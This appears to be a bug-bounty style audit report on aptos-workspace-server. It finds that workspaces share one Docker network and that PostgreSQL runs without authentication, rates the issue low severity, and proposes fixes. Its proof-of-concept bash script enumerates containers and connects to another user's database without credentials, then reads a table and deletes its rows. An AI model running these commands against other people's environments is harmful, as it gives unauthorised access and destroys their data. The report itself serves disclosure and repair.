# Audit Report

## Title
Workspace Database Isolation Failure via Shared Docker Network and Unauthenticated PostgreSQL Access

## Summary
The `aptos-workspace-server` creates multiple workspace instances that are intended to be isolated, but all workspaces share a single Docker network (`"aptos-workspace"`) and PostgreSQL containers run without authentication (`POSTGRES_HOST_AUTH_METHOD=trust`). This allows any user who discovers another workspace's `instance_id` to access and manipulate that workspace's database from within the shared Docker network.

## Finding Description

The aptos-workspace-server is designed to support multiple isolated local development environments running simultaneously. [1](#0-0) 

However, the implementation creates a shared Docker network for all workspaces rather than per-workspace isolation. [2](#0-1) 

Each workspace's PostgreSQL container is configured without authentication. [3](#0-2) 

The Docker network is explicitly created as non-internal, allowing connectivity. [4](#0-3) 

Container names follow a predictable pattern including the instance_id. [5](#0-4) 

The connection string construction for within-network access uses only the instance_id. [6](#0-5) 

**Attack Path:**
1. Attacker runs their own workspace on the same machine (same Docker daemon)
2. Attacker executes `docker ps` to enumerate all containers, revealing names like `aptos-workspace-{uuid}-postgres`
3. Attacker extracts victim's instance_id from the container name
4. Attacker starts a container on the shared `aptos-workspace` network or uses their own workspace's containers
5. Attacker connects to `postgres://postgres@aptos-workspace-{victim-uuid}-postgres:5432/local-testnet`
6. No credentials required due to trust authentication
7. Attacker has full read/write access to victim's indexer database

## Impact Explanation

This vulnerability allows cross-workspace database access in multi-user development environments. However, this is a **development tool**, not production infrastructure. It does not:
- Affect mainnet validators or nodes
- Impact consensus or blockchain safety
- Threaten on-chain funds or assets
- Compromise production storage systems

The impact is limited to **local development environments** where multiple developers share the same Docker daemon. In such scenarios, an attacker could:
- Read indexed blockchain data from other developers' workspaces
- Corrupt or delete database entries, causing development disruptions
- Inject malicious data into indexer tables

Under the Aptos bug bounty severity criteria, this would be **Low to Medium severity** at most, as it involves "state inconsistencies" and "information leaks" but only in non-production contexts.

## Likelihood Explanation

The likelihood is **LOW** because:
1. The tool is designed for single-developer local testing environments
2. Most developers run workspaces on their personal machines where they're the only user
3. Requires shared access to the same Docker daemon
4. Requires attacker to actively enumerate containers and extract instance_ids
5. Does not affect any production deployments

The vulnerability would only be relevant in:
- Shared CI/CD environments running multiple workspaces
- Multi-user development servers
- Containerized development platforms

## Recommendation

**Short-term fix:** Add authentication to PostgreSQL containers by removing the trust method and generating per-workspace passwords:

```rust
// In create_container_options_and_config, generate a password
let pg_password = Uuid::new_v4().to_string();
env: Some(vec![
    "POSTGRES_HOST_AUTH_METHOD=md5".to_string(),  // Changed from trust
    format!("POSTGRES_PASSWORD={}", pg_password),
    format!("POSTGRES_USER={}", POSTGRES_USER),
    format!("POSTGRES_DB={}", POSTGRES_DB_NAME),
]),
```

**Long-term fix:** Create per-workspace Docker networks for true isolation:

```rust
// In lib.rs, create workspace-specific network
let docker_network_name = format!("aptos-workspace-{}", instance_id);
```

## Proof of Concept

```bash
#!/bin/bash
# PoC: Cross-workspace database access

# Terminal 1: Victim starts their workspace
cargo run --bin aptos-workspace-server -- run &
VICTIM_PID=$!
sleep 30  # Wait for services to start

# Terminal 2: Attacker discovers victim's instance_id
VICTIM_CONTAINER=$(docker ps --filter "name=aptos-workspace-.*-postgres" --format "{{.Names}}" | head -1)
VICTIM_UUID=$(echo $VICTIM_CONTAINER | sed 's/aptos-workspace-\(.*\)-postgres/\1/')
echo "Found victim instance_id: $VICTIM_UUID"

# Attacker connects to victim's database from a container on the shared network
docker run --rm --network aptos-workspace postgres:14.11 \
  psql "postgres://postgres@aptos-workspace-${VICTIM_UUID}-postgres:5432/local-testnet" \
  -c "SELECT COUNT(*) FROM processor_status;"  # Read victim's data

# Attacker corrupts victim's database
docker run --rm --network aptos-workspace postgres:14.11 \
  psql "postgres://postgres@aptos-workspace-${VICTIM_UUID}-postgres:5432/local-testnet" \
  -c "DELETE FROM processor_status;"  # Delete all processor status

echo "Successfully accessed and modified victim's database"
kill $VICTIM_PID
```

**Note:** While this vulnerability is technically valid from a software security perspective, it does **not** meet the high bar for Aptos blockchain production security issues as it only affects development tooling, not consensus, execution, storage, governance, or staking components of the production blockchain.

### Citations

**File:** aptos-move/aptos-workspace-server/src/lib.rs (L14-15)
```rust
//! The services are bound to unique OS-assigned ports to allow for multiple local networks
//! to operate simultaneously, enabling testing and development in isolated environments.
```

**File:** aptos-move/aptos-workspace-server/src/lib.rs (L146-151)
```rust
    let docker_network_name = "aptos-workspace".to_string();
    let fut_docker_network = make_shared(create_docker_network_permanent(
        shutdown.clone(),
        fut_docker.clone(),
        docker_network_name,
    ));
```

**File:** aptos-move/aptos-workspace-server/src/services/postgres.rs (L65-70)
```rust
pub fn get_postgres_connection_string_within_docker_network(instance_id: Uuid) -> String {
    format!(
        "postgres://{}@aptos-workspace-{}-postgres:{}/{}",
        POSTGRES_USER, instance_id, POSTGRES_DEFAULT_PORT, POSTGRES_DB_NAME
    )
}
```

**File:** aptos-move/aptos-workspace-server/src/services/postgres.rs (L113-117)
```rust
        env: Some(vec![
            // We run postgres without any auth + no password.
            "POSTGRES_HOST_AUTH_METHOD=trust".to_string(),
            format!("POSTGRES_USER={}", POSTGRES_USER),
            format!("POSTGRES_DB={}", POSTGRES_DB_NAME),
```

**File:** aptos-move/aptos-workspace-server/src/services/postgres.rs (L142-145)
```rust
    let options = CreateContainerOptions {
        name: format!("aptos-workspace-{}-postgres", instance_id),
        ..Default::default()
    };
```

**File:** aptos-move/aptos-workspace-server/src/services/docker_common.rs (L38-44)
```rust
        let res = docker
            .create_network(CreateNetworkOptions {
                name: name.clone(),
                internal: false,
                check_duplicate: true,
                ..Default::default()
            })
```
